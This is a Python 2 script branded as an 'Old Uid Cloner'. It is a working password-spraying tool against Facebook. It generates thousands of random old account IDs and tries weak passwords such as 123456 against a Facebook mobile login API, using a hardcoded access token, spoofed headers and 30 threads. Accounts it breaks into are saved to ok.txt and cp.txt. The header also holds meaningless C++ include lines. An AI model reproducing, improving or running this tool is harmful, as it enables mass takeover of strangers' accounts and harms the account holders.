#!/usr/bin/python2
# -*- coding: utf-8
#!/usr/bin/env
#include <iostream>
#include <fstream>
#include <string>
#include <future>
#include <cstdio>
#include <vector>
#include <stdio.h>
#include <cython>
#include <platform>
#include <time>

class color:
     red = "\033[1;31m"
     green = "\033[1;32m"
     white = "\033[1;37m"

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid, subprocess, calendar
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from datetime import date
from datetime import datetime

try:
     import storage, requests, mechanize, bs4, futures
except Exception as e:
      print("ERROR : ",str(e))
      time.sleep(2)

try:
	os.mkdir('/sdcard/ids')
except:
	pass
try:
	import requests
except ImportError:
	os.system('pip2 install requests')
	os.mkdir('/sdcard/.data.txt')
reload(sys)
sys.setdefaultencoding('utf8')

ua = random.choice(['Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
 'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0 Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
 'Mozilla/5.0 (Linux; Android 10; Infinix X687 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/FB4A;FBAV/222.0.0.48.113;]',
 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
 'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)',
 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G977N/KSU4CTG1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36'])
url = "https://mbasic.facebook.com"
os.system('clear')

logo = """
   \033[1;32md8b   db\033[1;31m  .o88b. db       .d88b.  d8b   db d88888b d8888b.
   \033[1;32m888o  88\033[1;31m d8P  Y8 88      .8P  Y8. 888o  88 88'     88  `8D
   \033[1;32m88V8o 88\033[1;31m 8P      88      88    88 88V8o 88 88ooooo 88oob8Y'
   \033[1;32m88 V8o88\033[1;31m 8b      88      88    88 88 V8o88 88~~~~~ 88`8b
   \033[1;32m88  V888\033[1;31m Y8b  d8 88booo. `8b  d8' 88  V888 88.     88 `88.
   \033[1;32mVP   V8P\033[1;31m  `Y88P' Y88888P  `Y88P'  VP   V8P Y88888P 88   YD

\033[1;97m------------------------------------------------------
\033[1;31m>> \033[1;37m Author    \033[1;31m:\033[1;37m Nabil Rahman
\033[1;31m>> \033[1;37m Facebook  \033[1;31m:\033[1;37m nabil.404
\033[1;31m>> \033[1;37m Youtube   \033[1;31m:\033[1;37m 0xNabil
\033[1;31m>> \033[1;37m Github    \033[1;31m:\033[1;37m Nabil-Official
\033[1;97m------------------------------------------------------
"""
loop = 0
id = []
cp = []
ok = []

def main():
	os.system("clear")
#	os.system('xdg-open https://www.facebook.com/mrpardesi1')
	print (logo)
	print(""" 
              \033[1;31m[1] \033[1;37mOld Uid Cloner \033[1;32m(2006-2015)
              \033[1;31m[0] \033[1;37mExit
""")
	print
	inp()
def inp():
	input = raw_input('>>  \033[0;92m')
	if input == '1':
		start().__menu__()
	elif input == '0':
		os.system('exit')
	
	else:
		print ('')
		print ('\033[1;91m\tChoose correct option')
		print ('')
		main()

  
class start:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0 
	def __menu__(self):
		os.system("clear")
		print (logo)
		print("""                                                                              
                      \033[1;31m[1] \033[1;37mStart Cloning
                      \033[1;31m[0] \033[1;37mBack                              
""")
		choose =raw_input("\x1b[1;97m>> \x1b[1;97m")
		os.system("clear")
		print (logo)
		if choose in [""]:
			print(" \t\033[1;91m[!] SORRY YOUR CHOICE WRONG ")
			Adi1().__menu__()
		elif choose in ["1", "01"]:
			self.__fb__()
		elif choose in ["0", "00"]:
			main()
		else:
			Adi1().__menu__()
	
	def __fb__(self):
		x = 11111111
		xx = 99999999
		idx = "1000000" 
		try:
			for i in range(20000):
				i = random.randint(x,xx)
				ib = idx
				self.id.append(ib+str(i))
			
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\t     \033[1;97m\033[1;41m [ USE PASSWORD :  123456,102030 ] \033[0m")
				print(54*"\033[1;97m_")
           			print("")
				listpass = raw_input(" \033[1;97m[+]\x1b[1;97m ENTER PASSWORD : \x1b[1;92m")
				os.system("clear")
				print (logo)
				if len(listpass)<=5:
					exit("[!] password minimum 6 characters")
				print("\033[1;97m TOTAL IDZ : \033[0;92m%s"%(len(self.id))) 
				print("\033[1;97m THE PROCESS HAS BEEN STARTED....")
				print("")
				print("      \033[1;97m\033[1;41m [ USE AIRPLANE MODE FOR SPEEDUP CLONING ] \033[0m")
				print(54*"\x1b[1;97m_")
                   		print("")
				for user in self.id:
					coeg.submit(self.__api__, user, listpass.split(","))
			exit("\n\033[1;97m[+] Crack Finished...")
		except Exception as e:
			exit(str(e))
	
	def __api__(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
			'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
			'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
			'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
			'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
		])
		
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\033[1;97m[\033[1;92mNABIL-OK\033[1;97m]\033[1;92m %s | %s\033[0;92m"%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\033[1;97m[\033[1;91mNABIL-CP\033[1;97m] %s | %s\033[0;97m"%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
    
if __name__ == '__main__':
	main()
